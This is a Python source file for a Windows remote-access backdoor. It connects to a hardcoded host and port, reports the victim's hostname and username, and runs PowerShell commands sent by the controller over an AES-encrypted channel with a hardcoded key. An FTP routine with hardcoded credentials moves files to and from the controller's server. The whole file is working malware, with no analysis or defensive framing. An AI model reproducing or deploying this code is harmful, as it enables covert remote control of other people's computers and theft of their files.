import socket
import os
import subprocess
import getpass
from ftplib import FTP
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad

HOST = "192.168.30.52"
PORT = 6565
ftp_username = "Necati"
ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'


def encrypt_data(data):
    cipher = AES.new(aes_key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ciphertext

def decrypt_data(encrypted_data):
    iv = encrypted_data[:AES.block_size]
    ciphertext = encrypted_data[AES.block_size:]
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data

def info(f,client):
    ff = f"\033[32m{f}\033[0m\n"
    client.send(encrypt_data(ff.encode('utf-8')))



def first_connect(client):
    client.send(encrypt_data(socket.gethostname().encode('utf-8')))
    answer = decrypt_data(client.recv(1024)).decode("utf-8")
    if answer == "whoareyou":
        client.send(encrypt_data(getpass.getuser().encode("utf-8")))


def connect():
    while 1:
        pwd = os.getcwd()
        client.send(encrypt_data(pwd.encode('utf-8')))
        response = decrypt_data(client.recv(40960))
        command = response.decode('utf-8')
        try:
            if command.split(" ")[0] == "cd":
                os.chdir(command.split(" ")[1])
            elif command == 'close':
                info("[*] Connection closed !!!",client)
                break
            elif command.split(" ")[0] == "ftp":
                
                stdout = ftp_connect(command)
                info(stdout,client)
                continue
            stdout = subprocess.check_output(["powershell", "-Command",command])
        except :
            stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
            
        if stdout:
            client.send(encrypt_data(stdout))
        else:
            client.send(encrypt_data(b"\n"))
        time.sleep(0.3)



def ftp_connect(command):
    try:
        command_parts = command.split()
        command_type = command_parts[1]
        filename = command_parts[2]
        session = FTP()
        session.connect(HOST)
        session.login(user=ftp_username, passwd=ftp_password)
        
        if command_type == "-d":
            # Upload file
            with open(filename, 'rb') as f:
                session.storbinary(f'STOR {filename}', f)
            return f"[*] {filename} downloaded successfully."
            
        elif command_type == "-u":
            # Download file
            with open(filename, 'wb') as f:
                session.retrbinary(f'RETR {filename}', f.write)
            return f"[*] {filename}  uploaded successfully."
            
        else:
            return "[*] Invalid option !!!"
                
    except Exception as e:
        return f"Error: {e}"





client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
first_connect(client)
while 1:
    command = decrypt_data(client.recv(40960)).decode("utf-8")
    match command:
            case "connect":
                connect()
            case "exit":
                client.close()
                break

